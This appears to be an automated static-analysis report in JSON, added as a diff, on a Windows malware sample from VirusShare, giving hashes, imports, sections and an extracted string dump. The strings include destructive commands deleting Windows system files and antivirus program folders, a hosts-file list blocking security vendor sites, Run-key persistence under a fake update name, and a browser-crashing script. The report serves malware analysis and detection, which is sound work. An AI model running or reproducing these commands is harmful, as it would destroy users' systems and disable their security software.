@@ -1,0 +1,534 @@
+{
+    "docinfo": {},
+    "filename": "VirusShare_35b259a4d83e4d59be351c396fd6b95a",
+    "filesize": 12288,
+    "filetype": "PE32 executable (console) Intel 80386, for MS Windows",
+    "hashes": {
+        "md5": "35b259a4d83e4d59be351c396fd6b95a",
+        "sha1": "e20d0a5f2600162b76a2c89e3a101ce7240fcff8",
+        "sha256": "631cb88ed8edacc15ff90dea81ff661adc628d17919e6c138f6c867d5c46035b"
+    },
+    "peinfo": {
+        "behavior": [
+            "Xor",
+            "hijack_network",
+            "win_registry"
+        ],
+        "breakpoint": [
+            "CopyFileA",
+            "ExitProcess",
+            "FindWindowA",
+            "GetModuleFileNameA",
+            "GetModuleHandleA",
+            "GetSystemDirectoryA",
+            "MessageBoxA",
+            "RegCloseKey",
+            "RegOpenKeyA",
+            "RegOpenKeyExA",
+            "Sleep"
+        ],
+        "directories": {
+            "debug": {},
+            "export": [],
+            "import": {
+                "ADVAPI32.DLL": [
+                    {
+                        "function": "RegCloseKey",
+                        "offset": 4219148
+                    },
+                    {
+                        "function": "RegOpenKeyA",
+                        "offset": 4219152
+                    },
+                    {
+                        "function": "RegOpenKeyExA",
+                        "offset": 4219156
+                    },
+                    {
+                        "function": "RegSetValueExA",
+                        "offset": 4219160
+                    }
+                ],
+                "KERNEL32.dll": [
+                    {
+                        "function": "ExitProcess",
+                        "offset": 4219172
+                    },
+                    {
+                        "function": "GetModuleFileNameA",
+                        "offset": 4219176
+                    },
+                    {
+                        "function": "GetModuleHandleA",
+                        "offset": 4219180
+                    },
+                    {
+                        "function": "GetSystemDirectoryA",
+                        "offset": 4219184
+                    },
+                    {
+                        "function": "AllocConsole",
+                        "offset": 4219188
+                    },
+                    {
+                        "function": "CopyFileA",
+                        "offset": 4219192
+                    },
+                    {
+                        "function": "SetUnhandledExceptionFilter",
+                        "offset": 4219196
+                    },
+                    {
+                        "function": "Sleep",
+                        "offset": 4219200
+                    }
+                ],
+                "USER32.dll": [
+                    {
+                        "function": "FindWindowA",
+                        "offset": 4219288
+                    },
+                    {
+                        "function": "MessageBoxA",
+                        "offset": 4219292
+                    },
+                    {
+                        "function": "SendMessageA",
+                        "offset": 4219296
+                    },
+                    {
+                        "function": "ShowWindow",
+                        "offset": 4219300
+                    }
+                ],
+                "msvcrt.dll": [
+                    {
+                        "function": "_cexit",
+                        "offset": 4219212
+                    },
+                    {
+                        "function": "_fileno",
+                        "offset": 4219216
+                    },
+                    {
+                        "function": "_fmode",
+                        "offset": 4219220
+                    },
+                    {
+                        "function": "_fpreset",
+                        "offset": 4219224
+                    },
+                    {
+                        "function": "_iob",
+                        "offset": 4219228
+                    },
+                    {
+                        "function": "_setmode",
+                        "offset": 4219232
+                    },
+                    {
+                        "function": "__getmainargs",
+                        "offset": 4219236
+                    },
+                    {
+                        "function": "atexit",
+                        "offset": 4219240
+                    },
+                    {
+                        "function": "fclose",
+                        "offset": 4219244
+                    },
+                    {
+                        "function": "fopen",
+                        "offset": 4219248
+                    },
+                    {
+                        "function": "fprintf",
+                        "offset": 4219252
+                    },
+                    {
+                        "function": "__p__environ",
+                        "offset": 4219256
+                    },
+                    {
+                        "function": "rename",
+                        "offset": 4219260
+                    },
+                    {
+                        "function": "signal",
+                        "offset": 4219264
+                    },
+                    {
+                        "function": "strcat",
+                        "offset": 4219268
+                    },
+                    {
+                        "function": "system",
+                        "offset": 4219272
+                    },
+                    {
+                        "function": "__set_app_type",
+                        "offset": 4219276
+                    }
+                ]
+            },
+            "relocations": {
+                "Size": 0,
+                "VirtualAddress": 0,
+                "count": 0,
+                "details": {}
+            },
+            "resources": [],
+            "sign": {},
+            "tls": {
+                "AddressOfCallBacks": 65535,
+                "AddressOfIndex": 4,
+                "Characteristics": 0,
+                "EndAddressOfRawData": 3,
+                "SizeOfZeroFill": 184,
+                "StartAddressOfRawData": 9460301
+            }
+        },
+        "dll": false,
+        "entrypoint": 4564,
+        "features": {
+            "antidbg": [
+                "FindWindowA"
+            ],
+            "antivm": {},
+            "crypto": [],
+            "mutex": [],
+            "packer": [
+                "Video_Lan_Client",
+                "MinGW",
+                "Dev_Cpp_v4",
+                "Dev_Cpp_v4_additional"
+            ],
+            "xor": {}
+        },
+        "imagebase": 4194304,
+        "imphash": "fdda4e756fdf5f13f59e26062417fdbd",
+        "metadata": {},
+        "sections": {
+            "count": 4,
+            "details": [
+                {
+                    "characteristics": 1610612768,
+                    "data": "b'U\\x89\\xe5\\x83\\xec\\x18\\xc7E\\xfc\\x00\\x00\\x00\\x00\\x",
+                    "entropy": 5.8434513122206715,
+                    "executable": true,
+                    "hash": {
+                        "md5": "50c8551ca369b36115dad39947c544d1",
+                        "sha1": "58bfcb51cbe09baf0df4a06b666387693b755810",
+                        "sha256": "f0fb4c5cbc3807f0c4811131b7bfb48b2537f9a23f3fddebe0201f67326693ea"
+                    },
+                    "section_name": ".text",
+                    "size_of_raw_data": 9216,
+                    "virtual_address": 4096,
+                    "virtual_size": 8808
+                },
+                {
+                    "characteristics": 3221225536,
+                    "data": "b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\xff\\xff\\xff",
+                    "entropy": 0.12701076814887827,
+                    "executable": false,
+                    "hash": {
+                        "md5": "b980d8f04790111db045cf25bab5e4be",
+                        "sha1": "7a5cd9744278f9e0ae99b2bbeeba6370db7497be",
+                        "sha256": "b504e069a4d74c5e6c24d064e8a50598c5a1b6ff2512f7a0c9601ffa15c35885"
+                    },
+                    "section_name": ".data",
+                    "size_of_raw_data": 512,
+                    "virtual_address": 16384,
+                    "virtual_size": 40
+                },
+                {
+                    "characteristics": 3221225600,
+                    "data": "b''",
+                    "entropy": 0.0,
+                    "executable": false,
+                    "hash": {
+                        "md5": "d41d8cd98f00b204e9800998ecf8427e",
+                        "sha1": "da39a3ee5e6b4b0d3255bfef95601890afd80709",
+                        "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+                    },
+                    "section_name": ".bss",
+                    "size_of_raw_data": 0,
+                    "virtual_address": 20480,
+                    "virtual_size": 1824
+                },
+                {
+                    "characteristics": 3221225536,
+                    "data": "b'h`\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xacc\\",
+                    "entropy": 3.3906746582965557,
+                    "executable": false,
+                    "hash": {
+                        "md5": "1c455ff3d5f048ff2ee706dca8ceee84",
+                        "sha1": "59e96c50b30b6cf3d1eb3550507c281b619902d3",
+                        "sha256": "a3957ad2e302a9d9b397400f8270e23641df95afd04bb162067798f1d470253a"
+                    },
+                    "section_name": ".idata",
+                    "size_of_raw_data": 1536,
+                    "virtual_address": 24576,
+                    "virtual_size": 1112
+                }
+            ]
+        },
+        "timestamp": "2005-11-19 16:13:58"
+    },
+    "strings": {
+        "dump": [
+            "L!This program cannot be run in DOS mode.",
+            ".text",
+            "`.data",
+            ".bss",
+            ".idata",
+            "t{Ta@",
+            "t7sj",
+            "LtMj",
+            "\u043b\u060de[^",
+            "Windows Task Manager",
+            "Registry Editor",
+            "System Configuration Utility",
+            "Windows File Protection",
+            "Error",
+            "Access Violation at address: 0050666F",
+            "\\WUpdates.exe",
+            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+            "WUpdates",
+            "h Q@",
+            "C:\\windows",
+            "WUpdates.exe",
+            "C:\\windows\\system",
+            "MicroSuck.exe",
+            "C:\\windows\\system32",
+            "Svchost32.exe",
+            "Windows Security Updates",
+            "h Q@",
+            "C:\\WINDOWS\\System32\\drivers\\etc\\hosts",
+            "0.0.0.0 google.com",
+            " 0.0.0.0 www.hotmail.com",
+            " 0.0.0.0 www.microsoft.com",
+            " 0.0.0.0 microsoft.com",
+            " 0.0.0.0  macafee.com",
+            " 0.0.0.0 www.macafee.com",
+            " 0.0.0.0 download.mcafee.com",
+            " 0.0.0.0 www.download.mcafee.com",
+            " 0.0.0.0 rads.mcafee.com",
+            " 0.0.0.0 us.mcafee.com",
+            " 0.0.0.0 www.networkassociates.com",
+            " 0.0.0.0 networkassociates.com",
+            " 0.0.0.0 update.symantec.com",
+            " 0.0.0.0 updates.symantec.com",
+            " 0.0.0.0 iveupdate.symantec.com",
+            " 0.0.0.0 norton.com",
+            " 0.0.0.0 www.symantec.com",
+            " 0.0.0.0 symantec.com",
+            " 0.0.0.0 www.norton.com",
+            " 0.0.0.0 google.com",
+            " 0.0.0.0 bitdefender.com",
+            " 0.0.0.0 www.viruslist.com",
+            " 0.0.0.0 viruslist.com",
+            " 0.0.0.0 www.virustotal.com",
+            " 0.0.0.0 virustotal.com",
+            " 0.0.0.0 www.kaspersky.com",
+            " 0.0.0.0 kaspersky.com",
+            " 0.0.0.0 kaspersky-labs.com",
+            " 0.0.0.0 www.kaspersky-labs.com",
+            " 0.0.0.0 www.trendmicro.com",
+            " 0.0.0.0 trendmicro.com",
+            " 0.0.0.0 www.pandasoftware.com",
+            " 0.0.0.0 pandasoftware.com",
+            " 0.0.0.0 www.nod32.com",
+            " 0.0.0.0 nod32.com",
+            " 0.0.0.0 yahoo.com",
+            " 0.0.0.0 mail.yahoo.com",
+            " 0.0.0.0 www.grisoft.com",
+            " 0.0.0.0 www.f-secure.com",
+            " 0.0.0.0  f-secure.com",
+            "del C:\\WINDOWS\\*.exe /F /S /Q",
+            "del C:\\WINDOWS\\*.dll /F /S /Q",
+            "del C:\\WINDOWS\\System\\*.exe /F /S /Q",
+            "del C:\\WINDOWS\\System\\*.dll /F /S /Q",
+            "del C:\\WINDOWS\\System32\\*.exe /F /S /Q",
+            "del C:\\WINDOWS\\System32\\*.dll /F /S /Q",
+            "del C:\\WINDOWS\\System32\\Restore\\*.* /F /S /Q",
+            "del C:\\WINDOWS\\System32\\DRIVERS\\*.sys /F /S /Q",
+            "C:\\WINDOWS\\System32\\WUpdates.txt",
+            "0x0000000,0x0000000,Ax0000000,0x0000000,0x0000000,0x0000000",
+            "0x00C0000,Bx0000000,Ax0000000,0x0000000,0x0000000,0x0000000",
+            "0x00000F0,0x0000000,7x0000000,0x00FF000,Ax0000000,0x0000000",
+            "0x0000000,0x0000000,Ax0000000,0x0000000,0x000E000,0x0000000",
+            "0x0000000,0D0000000,Bx0000000,0x0000000,0x0000000,0x0000000",
+            "0x0000000,0x0000000,Nx0000000,0x0000000,0x0000000,0x0000000",
+            "Ax0000000,0x0000000,Ax0000000,0x0000000,0x0000000,0x0000000",
+            "0x0000000,0x0000000,Ax000F000,0x00CCC00,0x0000C00,0xFFF0000",
+            "3x0000000,0x0000000,Ax0000000,0x0000000,0x0000000,0x0000000",
+            "hp @",
+            "h0!@",
+            "hp!@",
+            "h0\"@",
+            "hp\"@",
+            "C:\\windows\\system32\\exploit.html",
+            "<html>",
+            "<script>",
+            "window.onerror=new Function(history.go(0));",
+            "function btf(){btf();}",
+            "btf();",
+            "</script>",
+            "</html>",
+            "Eh$@",
+            "h3%@",
+            "h:%@",
+            "hD%@",
+            "C:\\WINDOWS\\pchealth\\helpctr\\binaries\\msconfig.ex_",
+            "C:\\WINDOWS\\pchealth\\helpctr\\binaries\\msconfig.exe",
+            "C:\\WINDOWS\\regedit.ex_",
+            "C:\\WINDOWS\\regedit.exe",
+            "C:\\WINDOWS\\system32\\Restorerstrui\\rstrui.ex_",
+            "C:\\WINDOWS\\system32\\Restorerstrui\\rstrui.exe",
+            "C:\\WINDOWS\\system32\\wscui.cp_",
+            "C:\\WINDOWS\\system32\\wscui.cpl",
+            "C:\\WINDOWS\\system32\\wupdagr.ex_",
+            "C:\\WINDOWS\\system32\\wupdmgr.exe",
+            "C:\\WINDOWS\\system32\\taskdae.ex_",
+            "C:\\WINDOWS\\system32\\taskmgr.exe",
+            "hP&@",
+            "h;'@",
+            "jdh\t",
+            "hp'@",
+            "jdF\t",
+            "jd$\t",
+            "del C:\\Program Files\\McAfee.com\\Personal Firewall\\*.dll /F /S /Q ",
+            "del C:\\Program Files\\McAfee.com\\Personal Firewall\\data\\*.* /F /S /Q ",
+            "del C:\\Program Files\\McAfee.com\\Personal Firewall\\help\\*.* /F /S /Q ",
+            "del C:\\Program Files\\McAfee.com\\VSO\\*.dll /F /S /Q ",
+            "del C:\\Program Files\\McAfee.com\\VSO\\*.ini /F /S /Q ",
+            "del C:\\Program Files\\McAfee.com\\VSO\\Res00\\*.dll /F /S /Q ",
+            "del C:\\Program Files\\McAfee.com\\VSO\\Dat\\4615\\*.* /F /S /Q ",
+            "del C:\\Program Files\\McAfee.com\\*.* /F /S /Q ",
+            "del C:\\Program Files\\Norton AntiVirus\\*.dll /F /S /Q ",
+            "del C:\\Program Files\\Common Files\\Symantec Shared\\*.exe /F /S /Q ",
+            "del C:\\Program Files\\Norton AntiVirus\\*.ini /F /S /Q",
+            "del C:\\Program Files\\Norton AntiVirus\\*.exe /F /S /Q ",
+            "del C:\\Program Files\\Norton AntiVirus\\*.inf /F /S /Q ",
+            "del C:\\Program Files\\Zone Labs\\ZoneAlarm\\*.exe  /F /S /Q ",
+            "del C:\\Program Files\\Zone Labs\\ZoneAlarm\\*.zap /F /S /Q ",
+            "del C:\\Program Files\\Zone Labs\\ZoneAlarm\\*.dll /F /S /Q ",
+            "del C:\\Program Files\\Zone Labs\\ZoneAlarm\\repair\\*.dll /F /S /Q ",
+            "del C:\\Program Files\\Kaspersky Lab\\AVP6\\*.exe /F /S /Q ",
+            "del C:\\Program Files\\Kaspersky Lab\\AVP6\\*.dll /F /S /Q ",
+            "hp)@",
+            "h0*@",
+            "hp*@",
+            "h0+@",
+            "hp+@",
+            "hP,@",
+            "hP-@",
+            "ConsoleWindowClass",
+            "c:\\NError.dmp",
+            "Stop: 0x0000000A (0xFFFFFFFC,0x00000002,0x00000000,0x804DC42A)",
+            "Eh/@",
+            "SX2@",
+            "1=\\2@",
+            "Kuh0@",
+            "%Ta@",
+            "%\\a@",
+            "%La@",
+            "%xa@",
+            "%Xa@",
+            "%Pa@",
+            "%`a@",
+            "%da@",
+            "%|a@",
+            "%la@",
+            "%ta@",
+            "%pa@",
+            "%ha@",
+            "%<a@",
+            "%$a@",
+            "%@a@",
+            "%,a@",
+            "%(a@",
+            "%0a@",
+            "%8a@",
+            "%4a@",
+            "RegCloseKey",
+            "RegOpenKeyA",
+            "RegOpenKeyExA",
+            "RegSetValueExA",
+            "ExitProcess",
+            "GetModuleFileNameA",
+            "GetModuleHandleA",
+            "GetSystemDirectoryA",
+            "AllocConsole",
+            "CopyFileA",
+            "SetUnhandledExceptionFilter",
+            "Sleep",
+            "_cexit",
+            "_fileno",
+            "_fmode",
+            "_fpreset",
+            "_iob",
+            "_setmode",
+            "__getmainargs",
+            "atexit",
+            "fclose",
+            "fopen",
+            "fprintf",
+            "__p__environ",
+            "rename",
+            "signal",
+            "strcat",
+            "system",
+            "__set_app_type",
+            "FindWindowA",
+            "MessageBoxA",
+            "SendMessageA",
+            "ShowWindow",
+            "ADVAPI32.DLL",
+            "KERNEL32.dll",
+            "msvcrt.dll",
+            "USER32.dll"
+        ],
+        "file": {
+            "ADVAPI32.DLL": "Library",
+            "C:\\WINDOWS\\System32\\WUpdates.txt": "Text",
+            "C:\\WINDOWS\\pchealth\\helpctr\\binaries\\msconfig.exe": "Executable",
+            "C:\\WINDOWS\\regedit.exe": "Executable",
+            "C:\\WINDOWS\\system32\\Restorerstrui\\rstrui.exe": "Executable",
+            "C:\\WINDOWS\\system32\\taskmgr.exe": "Executable",
+            "C:\\WINDOWS\\system32\\wupdmgr.exe": "Executable",
+            "KERNEL32.dll": "Library",
+            "MicroSuck.exe": "Executable",
+            "Svchost32.exe": "Executable",
+            "USER32.dll": "Library",
+            "WUpdates.exe": "Executable",
+            "\\WUpdates.exe": "Executable",
+            "msvcrt.dll": "Library"
+        },
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.620145",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": [
+        {
+            "packer_compiler_signatures.yar": "IsPE32"
+        },
+        {
+            "packer_compiler_signatures.yar": "IsConsole"
+        },
+        {
+            "packer.yar": "VideoLanClient"
+        },
+        {
+            "packer.yar": "DevCv4"
+        }
+    ]
+}
